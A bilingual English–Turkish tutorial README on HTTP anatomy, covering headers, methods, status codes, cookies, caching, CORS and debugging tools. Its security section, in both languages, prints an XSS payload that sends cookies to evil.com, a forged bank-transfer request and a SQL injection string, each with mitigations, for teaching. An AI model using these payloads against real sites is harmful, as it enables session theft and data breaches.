# 🌐 HTTP Anatomy / HTTP Anatomisi

> **Select your language / Dilinizi seçin** 👇

---

<details>
<summary><strong>🇬🇧 English</strong></summary>

<br>

> ### 🎬 **Video Recommendation:** [From TCP to HTTP](https://www.youtube.com/watch?v=FknTw9bJsXM)

# HTTP Anatomy — A Deep Dive

## 📌 What is HTTP?

**HTTP** (HyperText Transfer Protocol) is the foundation of data communication on the World Wide Web. It is a stateless, application-layer protocol that defines how messages are formatted and transmitted between a **client** (e.g., browser) and a **server**.

> HTTP follows a **request–response** model: the client sends a request, the server returns a response.

---

## 🔬 Anatomy of an HTTP Request

An HTTP request consists of four main parts:

```
METHOD /path HTTP/version
Headers

Body (optional)
```

### 1. 🟦 Request Line

The first line of every HTTP request. It contains:

| Component | Description | Example |
|-----------|-------------|---------|
| **Method** | The action to perform | `GET`, `POST`, `DELETE` |
| **Request URI** | The resource path | `/api/users/42` |
| **HTTP Version** | Protocol version | `HTTP/1.1`, `HTTP/2` |

```
GET /api/users/42 HTTP/1.1
```

---

### 2. 📋 Request Headers

Key-value pairs that carry metadata about the request.

```http
GET /api/users/42 HTTP/1.1
Host: api.example.com
Accept: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
Content-Type: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```

#### 🔑 Common Request Headers

| Header | Purpose | Example Value |
|--------|---------|---------------|
| `Host` | Target server hostname | `api.example.com` |
| `Authorization` | Authentication credentials | `Bearer <token>` |
| `Content-Type` | Format of the request body | `application/json` |
| `Accept` | Expected response format | `application/json` |
| `User-Agent` | Client software identity | `Mozilla/5.0 ...` |
| `Cookie` | Stored cookies sent to server | `session=abc123` |
| `Cache-Control` | Caching directives | `no-cache` |
| `Accept-Encoding` | Supported compression formats | `gzip, br` |
| `Referer` | Previous page URL | `https://example.com/home` |
| `Origin` | Source of cross-origin request | `https://app.example.com` |

---

### 3. 📦 Request Body & Content Types

Carries the payload — used in `POST`, `PUT`, `PATCH` requests. The `Content-Type` header tells the server how to parse the body.

#### `application/json` — API calls
```http
POST /api/users HTTP/1.1
Host: api.example.com
Content-Type: application/json
Content-Length: 72

{
  "name": "Alice",
  "email": "alice@example.com",
  "role": "admin"
}
```

#### `application/x-www-form-urlencoded` — HTML form default
Key-value pairs joined by `&`, special characters URL-encoded.
```http
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=alice&password=s3cr3t&remember=true
```

#### `multipart/form-data` — File uploads
Each part has its own headers, separated by a `boundary`.
```http
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----Boundary123

----Boundary123
Content-Disposition: form-data; name="username"

alice
----Boundary123
Content-Disposition: form-data; name="avatar"; filename="photo.jpg"
Content-Type: image/jpeg

[binary file content...]
----Boundary123--
```

| Content-Type | Used For | Body Format |
|---|---|---|
| `application/json` | REST APIs | JSON text |
| `application/x-www-form-urlencoded` | HTML forms | `key=value&key2=value2` |
| `multipart/form-data` | File uploads | Multi-part with boundary |
| `text/plain` | Raw text | Plain string |
| `application/octet-stream` | Binary data | Raw bytes |

---

### 4. 🔧 HTTP Methods (Verbs)

| Method | Purpose | Has Body? | Idempotent? | Safe? |
|--------|---------|-----------|-------------|-------|
| `GET` | Retrieve a resource | ❌ | ✅ | ✅ |
| `POST` | Create a new resource | ✅ | ❌ | ❌ |
| `PUT` | Replace a resource entirely | ✅ | ✅ | ❌ |
| `PATCH` | Partially update a resource | ✅ | ❌ | ❌ |
| `DELETE` | Remove a resource | ❌ | ✅ | ❌ |
| `HEAD` | Like GET but no body in response | ❌ | ✅ | ✅ |
| `OPTIONS` | Check allowed methods | ❌ | ✅ | ✅ |
| `CONNECT` | Establish a tunnel (HTTPS) | ❌ | ❌ | ❌ |
| `TRACE` | Diagnostic loop-back test | ❌ | ✅ | ✅ |

> **Idempotent**: Multiple identical requests produce the same result.  
> **Safe**: The request does not modify server state.

---

## 🔑 Authentication Schemes

HTTP uses the `Authorization` request header and `WWW-Authenticate` response header to handle authentication. Three schemes are widely used:

| Scheme | Header Example | Notes |
|--------|---------------|-------|
| **Basic** | `Authorization: Basic dXNlcjpwYXNz` | Username:password Base64-encoded. Use only over HTTPS. |
| **Bearer / JWT** | `Authorization: Bearer eyJhbGci...` | Token-based. Common in REST APIs and OAuth2 flows. |
| **OAuth2** | `Authorization: Bearer <access_token>` | Delegated authorization framework. Token obtained via separate auth flow. |

When a resource requires authentication, the server responds with `401 Unauthorized` and a `WWW-Authenticate` header indicating the accepted scheme:

```http
HTTP/1.1 401 Unauthorized
WWW-Authenticate: Bearer realm="api"
```

The client then retries with credentials:

```http
GET /api/profile HTTP/1.1
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
```

---

## 🔬 Anatomy of an HTTP Response

```
HTTP/version STATUS_CODE Reason-Phrase
Headers

Body (optional)
```

### 1. 🟩 Status Line

```
HTTP/1.1 200 OK
HTTP/1.1 404 Not Found
HTTP/1.1 301 Moved Permanently
```

---

### 2. 📋 Response Headers

```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Content-Length: 148
Date: Thu, 09 Apr 2026 10:00:00 GMT
Server: nginx/1.24.0
Cache-Control: max-age=3600
ETag: "33a64df551425fcc55e4d42a148795d9f25f89d"
Set-Cookie: session=xyz789; HttpOnly; Secure; SameSite=Strict
Access-Control-Allow-Origin: https://app.example.com
X-Request-Id: f47ac10b-58cc-4372-a567-0e02b2c3d479
```

#### 🔑 Common Response Headers

| Header | Purpose |
|--------|---------|
| `Content-Type` | Format of the response body |
| `Content-Length` | Size of the body in bytes |
| `Set-Cookie` | Store a cookie on the client |
| `Cache-Control` | How long to cache the response |
| `ETag` | Version identifier for caching |
| `Location` | Redirect target URL |
| `Access-Control-Allow-Origin` | CORS policy |
| `WWW-Authenticate` | Authentication challenge |
| `X-Request-Id` | Unique ID for tracing the request |

---

### 3. 📊 HTTP Status Codes

#### 1xx — Informational
| Code | Meaning |
|------|---------|
| `100` | Continue |
| `101` | Switching Protocols |

#### 2xx — Success ✅
| Code | Meaning |
|------|---------|
| `200` | OK |
| `201` | Created |
| `204` | No Content |
| `206` | Partial Content |

#### 3xx — Redirection 🔀
| Code | Meaning |
|------|---------|
| `301` | Moved Permanently |
| `302` | Found (Temporary Redirect) |
| `304` | Not Modified (cached) |
| `307` | Temporary Redirect |
| `308` | Permanent Redirect |

#### 4xx — Client Errors ❌
| Code | Meaning |
|------|---------|
| `400` | Bad Request |
| `401` | Unauthorized |
| `403` | Forbidden |
| `404` | Not Found |
| `405` | Method Not Allowed |
| `408` | Request Timeout |
| `409` | Conflict |
| `422` | Unprocessable Entity |
| `429` | Too Many Requests |

#### 5xx — Server Errors 💥
| Code | Meaning |
|------|---------|
| `500` | Internal Server Error |
| `501` | Not Implemented |
| `502` | Bad Gateway |
| `503` | Service Unavailable |
| `504` | Gateway Timeout |

---

## 🔄 HTTP Versions

| Version | Year | Key Feature |
|---------|------|-------------|
| **HTTP/0.9** | 1991 | Only GET, plain HTML responses |
| **HTTP/1.0** | 1996 | Headers, status codes, multiple content types |
| **HTTP/1.1** | 1997 | Persistent connections, chunked transfer, pipelining |
| **HTTP/2** | 2015 | Binary framing, multiplexing, header compression (HPACK) |
| **HTTP/3** | 2022 | Based on QUIC/UDP, 0-RTT connections, improved performance |

---

## 🔐 HTTPS & TLS

**HTTPS** = HTTP + **TLS** (Transport Layer Security)

```mermaid
sequenceDiagram
    participant C as Client
    participant S as Server
    C->>S: ClientHello (TLS)
    S-->>C: ServerHello + Certificate
    C->>S: Key Exchange
    S-->>C: Finished
    Note over C,S: 🔒 All HTTP traffic is now encrypted
```

TLS ensures:
- **Confidentiality** — data is encrypted
- **Integrity** — data cannot be tampered with
- **Authentication** — server identity is verified

---

## 🌐 URL Anatomy

```
https://api.example.com:8443/v1/users?page=2&limit=10#results
 │        │             │    │         │                │
 │        │             │    │         │                └── Fragment
 │        │             │    │         └── Query String
 │        │             │    └── Path
 │        │             └── Port
 │        └── Host
 └── Scheme (Protocol)
```

| Component | Example | Description |
|-----------|---------|-------------|
| Scheme | `https` | Protocol to use |
| Host | `api.example.com` | Domain name or IP |
| Port | `8443` | Port (default: 80/443) |
| Path | `/v1/users` | Resource location |
| Query | `page=2&limit=10` | Key-value parameters |
| Fragment | `#results` | Client-side anchor |

---

## 🍪 Cookies

Set by server via `Set-Cookie`, sent by client via `Cookie`.

```http
Set-Cookie: session=abc123; 
            Expires=Fri, 10 Apr 2026 00:00:00 GMT;
            Path=/;
            Domain=example.com;
            Secure;
            HttpOnly;
            SameSite=Strict
```

| Attribute | Purpose |
|-----------|---------|
| `Expires` / `Max-Age` | Cookie lifetime |
| `Secure` | Only sent over HTTPS |
| `HttpOnly` | Inaccessible to JavaScript |
| `SameSite` | CSRF protection (`Strict`, `Lax`, `None`) |
| `Domain` | Which domains receive the cookie |
| `Path` | Which paths receive the cookie |

---

## 🔄 Connection Management

### Keep-Alive (HTTP/1.1)
```http
Connection: keep-alive
Keep-Alive: timeout=5, max=100
```
Reuses the TCP connection for multiple requests.

### HTTP/2 Multiplexing
Multiple requests are sent in parallel over a single TCP connection using **streams**, each with a unique stream ID.

### HTTP/3 & QUIC
Runs over **UDP**, eliminating TCP's head-of-line blocking. Connection setup is faster via **0-RTT** (zero round-trip time resumption).

---

## 🗄️ Caching

HTTP caching avoids redundant requests by storing responses and reusing them. Key headers:

| Header | Direction | Purpose |
|--------|-----------|---------|
| `Cache-Control` | Both | Main caching directive (`max-age`, `no-cache`, `no-store`, `public`, `private`) |
| `ETag` | Response | A version fingerprint of the resource |
| `If-None-Match` | Request | Send with ETag value — server returns `304` if unchanged |
| `Last-Modified` | Response | Timestamp of last change |
| `If-Modified-Since` | Request | Server returns `304` if not modified since that time |
| `Expires` | Response | Legacy — absolute expiry date/time |

**Typical cache validation flow:**

```mermaid
sequenceDiagram
    participant C as Client
    participant S as Server
    C->>S: GET /logo.png HTTP/1.1
    S-->>C: 200 OK + ETag: "v2" + Cache-Control: max-age=3600
    Note over C: Cache stores response for 1 hour
    C->>S: GET /logo.png\nIf-None-Match: "v2"
    S-->>C: 304 Not Modified (no body sent)
    Note over C: Client reuses cached copy
```

> `Cache-Control: no-store` — never cache.  
> `Cache-Control: no-cache` — cache but always revalidate.  
> `Cache-Control: max-age=86400` — cache for 24 hours.

---

## 🧩 CORS (Cross-Origin Resource Sharing)

When a browser makes a request to a **different origin**, a CORS preflight may occur:

```http
OPTIONS /api/data HTTP/1.1
Origin: https://app.frontend.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Content-Type, Authorization
```

Server response:
```http
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://app.frontend.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Max-Age: 86400
```

---

## 🚨 Common Security Vulnerabilities

HTTP requests are a primary attack surface. Three vulnerabilities are especially relevant:

### CSRF (Cross-Site Request Forgery)
A malicious site tricks a user's browser into sending an authenticated request to another site — using the user's cookies automatically.

```
User is logged into bank.com (session cookie stored)
     ↓
Visits evil.com which has a hidden form:
     POST bank.com/transfer?to=attacker&amount=1000
     ↓
Browser auto-sends the bank.com session cookie → Attack succeeds
```

**Mitigations:** CSRF tokens, `SameSite=Strict` cookie attribute, checking `Origin`/`Referer` headers.

---

### XSS (Cross-Site Scripting)
Malicious scripts are injected into a web page via unsanitized user input, then executed in other users' browsers.

```
Attacker submits: <script>document.location='evil.com?c='+document.cookie</script>
Server stores it without sanitization → victims' browsers execute it → cookies stolen
```

**Mitigations:** Escape/sanitize all user input before rendering, use `Content-Security-Policy` header, `HttpOnly` cookies.

---

### Injection
Untrusted data is sent to an interpreter as a command. In HTTP context this typically means SQL injection via query strings or body parameters.

```
GET /users?id=1 OR 1=1--   →   dumps the entire users table
```

**Mitigations:** Parameterized queries, strict input validation, never trust raw request parameters.

---

## 🛠️ Tools & Debugging

| Tool | Type | Use Case |
|------|------|----------|
| **curl** | CLI | Send any HTTP request from the terminal |
| **Postman** | GUI | Build, test and document API requests visually |
| **Insomnia** | GUI | Lightweight Postman alternative |
| **Browser DevTools** | Browser | Inspect live requests, headers, timing, cookies |
| **httpie** | CLI | Human-friendly `curl` alternative |
| **Wireshark** | Network | Deep packet inspection of raw HTTP/TLS traffic |

**Quick curl examples:**
```bash
# GET with a header
curl -i https://api.example.com/users/1 \
     -H "Authorization: Bearer <token>"

# POST JSON
curl -X POST https://api.example.com/users \
     -H "Content-Type: application/json" \
     -d '{"name":"Alice","email":"alice@example.com"}'

# See full request + response headers
curl -v https://api.example.com/users
```

> In **Browser DevTools → Network tab**: click any request to inspect its headers, body, status code, and timing waterfall.

---

## 📡 A Complete HTTP Exchange

```mermaid
sequenceDiagram
    participant B as Browser
    participant D as DNS
    participant S as Server
    B->>D: DNS Lookup (api.example.com)
    D-->>B: IP Address
    B->>S: TCP Handshake (SYN)
    S-->>B: TCP Handshake (SYN-ACK)
    B->>S: TCP Handshake (ACK)
    B->>S: TLS Handshake
    S-->>B: TLS Handshake (Certificate)
    Note over B,S: 🔒 Encrypted tunnel established
    B->>S: GET /api/users/1 HTTP/1.1
    S-->>B: HTTP/1.1 200 OK + JSON body
    B->>S: TCP FIN
    S-->>B: TCP FIN-ACK
```

</details>

---

<details open>
<summary><strong>🇹🇷 Türkçe</strong></summary>

<br>

> ### 🎬 **Video Önerisi:** [From TCP to HTTP](https://www.youtube.com/watch?v=FknTw9bJsXM)

# HTTP Anatomisi — Derinlemesine İnceleme

## 📌 HTTP Nedir?

**HTTP** (HyperText Transfer Protocol — HiperMetin Transfer Protokolü), World Wide Web üzerindeki veri iletişiminin temelini oluşturur. Bir **istemci** (tarayıcı gibi) ile **sunucu** arasındaki mesajların nasıl biçimlendirileceğini ve iletileceğini tanımlayan, durumsuz (stateless), uygulama katmanı protokolüdür.

> HTTP, **istek–yanıt** modeli izler: istemci bir istek gönderir, sunucu bir yanıt döndürür.

---

## 🔬 HTTP İsteğinin Anatomisi

Bir HTTP isteği dört ana bölümden oluşur:

```
METOD /yol HTTP/versiyon
Başlıklar

Gövde (isteğe bağlı)
```

### 1. 🟦 İstek Satırı (Request Line)

Her HTTP isteğinin ilk satırıdır. Şunları içerir:

| Bileşen | Açıklama | Örnek |
|---------|----------|-------|
| **Metod** | Gerçekleştirilecek eylem | `GET`, `POST`, `DELETE` |
| **İstek URI** | Kaynak yolu | `/api/users/42` |
| **HTTP Versiyonu** | Protokol sürümü | `HTTP/1.1`, `HTTP/2` |

```
GET /api/users/42 HTTP/1.1
```

---

### 2. 📋 İstek Başlıkları (Request Headers)

İstek hakkında meta veri taşıyan anahtar-değer çiftleridir.

```http
GET /api/users/42 HTTP/1.1
Host: api.ornek.com
Accept: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
Content-Type: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```

#### 🔑 Yaygın İstek Başlıkları

| Başlık | Amaç | Örnek Değer |
|--------|------|-------------|
| `Host` | Hedef sunucu alan adı | `api.ornek.com` |
| `Authorization` | Kimlik doğrulama bilgileri | `Bearer <token>` |
| `Content-Type` | İstek gövdesinin formatı | `application/json` |
| `Accept` | Beklenen yanıt formatı | `application/json` |
| `User-Agent` | İstemci yazılım kimliği | `Mozilla/5.0 ...` |
| `Cookie` | Sunucuya gönderilen çerezler | `oturum=abc123` |
| `Cache-Control` | Önbellekleme direktifleri | `no-cache` |
| `Accept-Encoding` | Desteklenen sıkıştırma formatları | `gzip, br` |
| `Referer` | Önceki sayfanın URL'si | `https://ornek.com/anasayfa` |
| `Origin` | Çapraz kaynak isteğinin kaynağı | `https://uygulama.ornek.com` |

---

### 3. 📦 İstek Gövdesi ve İçerik Türleri (Request Body & Content Types)

Veri yükünü taşır — `POST`, `PUT`, `PATCH` isteklerinde kullanılır. `Content-Type` başlığı sunucuya gövdenin nasıl ayrıştırılacağını söyler.

#### `application/json` — API çağrıları
```http
POST /api/users HTTP/1.1
Host: api.ornek.com
Content-Type: application/json
Content-Length: 80

{
  "name": "Ayşe",
  "email": "ayse@ornek.com",
  "role": "yonetici"
}
```

#### `application/x-www-form-urlencoded` — HTML form varsayılanı
Anahtar-değer çiftleri `&` ile birleştirilir, özel karakterler URL-kodlanır.
```http
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=ayse&password=g1zl1&remember_me=true
```

#### `multipart/form-data` — Dosya yükleme
Her bölümün kendi başlıkları vardır ve `boundary` ile birbirinden ayrılır.
```http
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----Boundary123

----Boundary123
Content-Disposition: form-data; name="kullanici"

ayse
----Boundary123
Content-Disposition: form-data; name="avatar"; filename="foto.jpg"
Content-Type: image/jpeg

[ikili dosya içeriği...]
----Boundary123--
```

| İçerik Türü | Kullanım Amacı | Gövde Formatı |
|---|---|---|
| `application/json` | REST API'ler | JSON metni |
| `application/x-www-form-urlencoded` | HTML formlar | `anahtar=deger&anahtar2=deger2` |
| `multipart/form-data` | Dosya yüklemeleri | Boundary ile ayrılmış çok parçalı |
| `text/plain` | Ham metin | Düz yazı |
| `application/octet-stream` | İkili veri | Ham baytlar |

---

### 4. 🔧 HTTP Metodları (Fiiller)

| Metod | Amaç | Gövde Var mı? | Idempotent mi? | Güvenli mi? |
|-------|------|---------------|----------------|-------------|
| `GET` | Kaynak getir | ❌ | ✅ | ✅ |
| `POST` | Yeni kaynak oluştur | ✅ | ❌ | ❌ |
| `PUT` | Kaynağı tamamen güncelle | ✅ | ✅ | ❌ |
| `PATCH` | Kaynağı kısmen güncelle | ✅ | ❌ | ❌ |
| `DELETE` | Kaynağı sil | ❌ | ✅ | ❌ |
| `HEAD` | GET gibi ama yanıt gövdesi yok | ❌ | ✅ | ✅ |
| `OPTIONS` | İzin verilen metodları sorgula | ❌ | ✅ | ✅ |
| `CONNECT` | Tünel kur (HTTPS) | ❌ | ❌ | ❌ |
| `TRACE` | Tanılama amaçlı geri yansıma testi | ❌ | ✅ | ✅ |

> **Idempotent**: Aynı isteğin birden fazla kez tekrarlanması aynı sonucu verir.  
> **Güvenli**: İstek, sunucu durumunu değiştirmez.

---

## 🔑 Kimlik Doğrulama Şemaları (Authentication)

HTTP, kimlik doğrulama için `Authorization` istek başlığını ve `WWW-Authenticate` yanıt başlığını kullanır. Yaygın olarak kullanılan üç şema:

| Şema | Başlık Örneği | Notlar |
|------|--------------|-------|
| **Basic** | `Authorization: Basic dXNlcjpwYXNz` | Kullanıcı adı:şifre Base64 ile kodlanır. Yalnızca HTTPS üzerinde kullanın. |
| **Bearer / JWT** | `Authorization: Bearer eyJhbGci...` | Token tabanlı. REST API ve OAuth2 akışlarında yaygın. |
| **OAuth2** | `Authorization: Bearer <access_token>` | Yetkilendirme çerçevesi. Token ayrı bir auth akışıyla alınır. |

Bir kaynak kimlik doğrulama gerektirdiğinde, sunucu `401 Unauthorized` ve kabul ettiği şemayı belirten `WWW-Authenticate` başlığıyla yanıt verir:

```http
HTTP/1.1 401 Unauthorized
WWW-Authenticate: Bearer realm="api"
```

İstemci ardından kimlik bilgileriyle isteği tekrarlar:

```http
GET /api/profil HTTP/1.1
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
```

---

## 🔬 HTTP Yanıtının Anatomisi

```
HTTP/versiyon DURUM_KODU Açıklama
Başlıklar

Gövde (isteğe bağlı)
```

### 1. 🟩 Durum Satırı (Status Line)

```
HTTP/1.1 200 OK
HTTP/1.1 404 Not Found
HTTP/1.1 301 Moved Permanently
```

---

### 2. 📋 Yanıt Başlıkları (Response Headers)

```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Content-Length: 148
Date: Thu, 09 Apr 2026 10:00:00 GMT
Server: nginx/1.24.0
Cache-Control: max-age=3600
ETag: "33a64df551425fcc55e4d42a148795d9f25f89d"
Set-Cookie: oturum=xyz789; HttpOnly; Secure; SameSite=Strict
Access-Control-Allow-Origin: https://uygulama.ornek.com
X-Request-Id: f47ac10b-58cc-4372-a567-0e02b2c3d479
```

#### 🔑 Yaygın Yanıt Başlıkları

| Başlık | Amaç |
|--------|------|
| `Content-Type` | Yanıt gövdesinin formatı |
| `Content-Length` | Gövdenin bayt cinsinden boyutu |
| `Set-Cookie` | İstemcide çerez sakla |
| `Cache-Control` | Yanıtın ne kadar süre önbellekte tutulacağı |
| `ETag` | Önbellekleme için sürüm tanımlayıcısı |
| `Location` | Yönlendirme hedef URL'si |
| `Access-Control-Allow-Origin` | CORS politikası |
| `WWW-Authenticate` | Kimlik doğrulama talebi |
| `X-Request-Id` | İsteği izlemek için benzersiz ID |

---

### 3. 📊 HTTP Durum Kodları

#### 1xx — Bilgilendirme
| Kod | Anlam |
|-----|-------|
| `100` | Devam Et (Continue) |
| `101` | Protokol Değiştiriliyor (Switching Protocols) |

#### 2xx — Başarı ✅
| Kod | Anlam |
|-----|-------|
| `200` | Tamam (OK) |
| `201` | Oluşturuldu (Created) |
| `204` | İçerik Yok (No Content) |
| `206` | Kısmi İçerik (Partial Content) |

#### 3xx — Yönlendirme 🔀
| Kod | Anlam |
|-----|-------|
| `301` | Kalıcı Olarak Taşındı (Moved Permanently) |
| `302` | Bulundu / Geçici Yönlendirme (Found) |
| `304` | Değiştirilmedi / Önbellekten Kullan (Not Modified) |
| `307` | Geçici Yönlendirme (Temporary Redirect) |
| `308` | Kalıcı Yönlendirme (Permanent Redirect) |

#### 4xx — İstemci Hataları ❌
| Kod | Anlam |
|-----|-------|
| `400` | Hatalı İstek (Bad Request) |
| `401` | Yetkisiz (Unauthorized) |
| `403` | Yasak (Forbidden) |
| `404` | Bulunamadı (Not Found) |
| `405` | Metod İzin Verilmiyor (Method Not Allowed) |
| `408` | İstek Zaman Aşımı (Request Timeout) |
| `409` | Çakışma (Conflict) |
| `422` | İşlenemeyen Varlık (Unprocessable Entity) |
| `429` | Çok Fazla İstek (Too Many Requests) |

#### 5xx — Sunucu Hataları 💥
| Kod | Anlam |
|-----|-------|
| `500` | Dahili Sunucu Hatası (Internal Server Error) |
| `501` | Uygulanmadı (Not Implemented) |
| `502` | Hatalı Ağ Geçidi (Bad Gateway) |
| `503` | Hizmet Kullanılamıyor (Service Unavailable) |
| `504` | Ağ Geçidi Zaman Aşımı (Gateway Timeout) |

---

## 🔄 HTTP Versiyonları

| Versiyon | Yıl | Temel Özellik |
|----------|-----|---------------|
| **HTTP/0.9** | 1991 | Yalnızca GET, düz HTML yanıtları |
| **HTTP/1.0** | 1996 | Başlıklar, durum kodları, çoklu içerik türleri |
| **HTTP/1.1** | 1997 | Kalıcı bağlantılar, parçalı aktarım, boru hattı |
| **HTTP/2** | 2015 | İkili çerçeveleme, çoklama, başlık sıkıştırma (HPACK) |
| **HTTP/3** | 2022 | QUIC/UDP tabanlı, 0-RTT bağlantıları, iyileştirilmiş performans |

---

## 🔐 HTTPS ve TLS

**HTTPS** = HTTP + **TLS** (Aktarım Katmanı Güvenliği)

```mermaid
sequenceDiagram
    participant C as İstemci
    participant S as Sunucu
    C->>S: ClientHello (TLS)
    S-->>C: ServerHello + Sertifika
    C->>S: Anahtar Değişimi
    S-->>C: Tamamlandı
    Note over C,S: 🔒 Tüm HTTP trafiği artık şifreli
```

TLS şunları sağlar:
- **Gizlilik** — veriler şifrelenir
- **Bütünlük** — veriler değiştirilemez
- **Kimlik Doğrulama** — sunucu kimliği doğrulanır

---

## 🌐 URL Anatomisi

```
https://api.ornek.com:8443/v1/users?sayfa=2&limit=10#sonuclar
 │        │            │    │              │                  │
 │        │            │    │              │                  └── Parça (Fragment)
 │        │            │    │              └── Sorgu Dizisi (Query String)
 │        │            │    └── Yol (Path)
 │        │            └── Port
 │        └── Host (Alan Adı)
 └── Şema (Protokol)
```

| Bileşen | Örnek | Açıklama |
|---------|-------|----------|
| Şema | `https` | Kullanılacak protokol |
| Host | `api.ornek.com` | Alan adı veya IP |
| Port | `8443` | Port (varsayılan: 80/443) |
| Yol | `/v1/users` | Kaynak konumu |
| Sorgu | `sayfa=2&limit=10` | Anahtar-değer parametreleri |
| Parça | `#sonuclar` | İstemci taraflı çıpa |

---

## 🍪 Çerezler (Cookies)

Sunucu tarafından `Set-Cookie` ile ayarlanır, istemci tarafından `Cookie` ile gönderilir.

```http
Set-Cookie: oturum=abc123; 
            Expires=Fri, 10 Apr 2026 00:00:00 GMT;
            Path=/;
            Domain=ornek.com;
            Secure;
            HttpOnly;
            SameSite=Strict
```

| Öznitelik | Amaç |
|-----------|------|
| `Expires` / `Max-Age` | Çerezin geçerlilik süresi |
| `Secure` | Yalnızca HTTPS üzerinden gönderilir |
| `HttpOnly` | JavaScript ile erişilemez |
| `SameSite` | CSRF koruması (`Strict`, `Lax`, `None`) |
| `Domain` | Hangi alan adlarının çerezi alacağı |
| `Path` | Hangi yolların çerezi alacağı |

---

## 🔄 Bağlantı Yönetimi

### Keep-Alive (HTTP/1.1)
```http
Connection: keep-alive
Keep-Alive: timeout=5, max=100
```
TCP bağlantısını birden fazla istek için yeniden kullanır.

### HTTP/2 Çoklama (Multiplexing)
Birden fazla istek, benzersiz bir akış ID'si olan **stream**'ler kullanılarak tek bir TCP bağlantısı üzerinden paralel olarak gönderilir.

### HTTP/3 ve QUIC
TCP'nin satır başı engelleme sorununu ortadan kaldırarak **UDP** üzerinde çalışır. **0-RTT** (sıfır gidiş-dönüş süresi) ile bağlantı kurulumu daha hızlıdır.

---

## 🗄️ Önbellekleme (Caching)

HTTP önbellekleme, tekrar eden isteklerin gereksiz ağ yükünü azaltmak için yanıtları saklayıp yeniden kullanır. Temel başlıklar:

| Başlık | Yön | Amaç |
|--------|-----|------|
| `Cache-Control` | Her iki yön | Ana önbellekleme direktifi (`max-age`, `no-cache`, `no-store`, `public`, `private`) |
| `ETag` | Yanıt | Kaynağın versiyon parmak izi |
| `If-None-Match` | İstek | ETag değeriyle gönderilir — değişmediyse sunucu `304` döndürür |
| `Last-Modified` | Yanıt | Son değişiklik zaman damgası |
| `If-Modified-Since` | İstek | O tarihten beri değişmemişse sunucu `304` döndürür |
| `Expires` | Yanıt | Eski yöntem — mutlak geçerlilik süresi |

**Tipik önbellek doğrulama akışı:**

```mermaid
sequenceDiagram
    participant C as İstemci
    participant S as Sunucu
    C->>S: GET /logo.png HTTP/1.1
    S-->>C: 200 OK + ETag: "v2" + Cache-Control: max-age=3600
    Note over C: Yanıt 1 saat önbellekte saklanır
    C->>S: GET /logo.png\nIf-None-Match: "v2"
    S-->>C: 304 Not Modified (gövde gönderilmez)
    Note over C: İstemci önbellekteki kopyayı kullanır
```

> `Cache-Control: no-store` — hiç önbellekleme.  
> `Cache-Control: no-cache` — önbellekle ama her seferinde doğrula.  
> `Cache-Control: max-age=86400` — 24 saat önbelleğe al.

---

## 🧩 CORS (Çapraz Kaynak Kaynak Paylaşımı)

Tarayıcı **farklı bir kaynağa** istek yaptığında, bir CORS ön uçuşu (preflight) gerçekleşebilir:

```http
OPTIONS /api/veri HTTP/1.1
Origin: https://uygulama.frontend.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Content-Type, Authorization
```

Sunucu yanıtı:
```http
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://uygulama.frontend.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Max-Age: 86400
```

---

## 🚨 Yaygın Güvenlik Açıkları

HTTP istekleri birincil saldırı yüzeyidir. Özellikle dikkat edilmesi gereken üç açık:

### CSRF (Siteler Arası İstek Sahteciliği)
Kötü amaçlı bir site, kullanıcının tarayıcısını başka bir siteye kimlik doğrulamalı istek göndermesi için kandırır — kullanıcının çerezlerini otomatik olarak kullanarak.

```
Kullanıcı banka.com'da oturum açık (oturum çerezi var)
     ↓
evil.com'u ziyaret eder, orada gizli bir form var:
     POST banka.com/transfer?hedef=saldirgan&miktar=1000
     ↓
Tarayıcı banka.com oturum çerezini otomatik gönderir → Saldırı başarılı
```

**Önlemler:** CSRF token, `SameSite=Strict` çerez özniteliği, `Origin`/`Referer` başlık kontrolü.

---

### XSS (Siteler Arası Betik Çalıştırma)
Temizlenmemiş kullanıcı girdisi aracılığıyla web sayfasına zararlı betikler enjekte edilir ve diğer kullanıcıların tarayıcılarında çalıştırılır.

```
Saldırgan şunu gönderir: <script>document.location='evil.com?c='+document.cookie</script>
Sunucu temizlemeden saklar → kurban tarayıcıları çalıştırır → çerezler çalınır
```

**Önlemler:** Tüm kullanıcı girdisini render etmeden önce kaçır/temizle, `Content-Security-Policy` başlığı kullan, `HttpOnly` çerezleri.

---

### Enjeksiyon (Injection)
Güvenilmeyen veri bir yorumlayıcıya komut olarak gönderilir. HTTP bağlamında bu genellikle sorgu dizeleri veya gövde parametreleri aracılığıyla SQL enjeksiyonu anlamına gelir.

```
GET /users?id=1 OR 1=1--   →   tüm kullanıcı tablosunu döker
```

**Önlemler:** Parametreli sorgular, sıkı girdi doğrulaması, ham istek parametrelerine asla güvenmemek.

---

## 🛠️ Araçlar ve Hata Ayıklama

| Araç | Tür | Kullanım Amacı |
|------|-----|----------------|
| **curl** | CLI | Terminalden herhangi bir HTTP isteği gönderme |
| **Postman** | GUI | API isteklerini görsel olarak oluşturma, test etme ve belgeleme |
| **Insomnia** | GUI | Hafif Postman alternatifi |
| **Browser DevTools** | Tarayıcı | Canlı istekleri, başlıkları, zamanlamayı, çerezleri inceleme |
| **httpie** | CLI | İnsan dostu `curl` alternatifi |
| **Wireshark** | Ağ | Ham HTTP/TLS trafiğinin derin paket incelemesi |

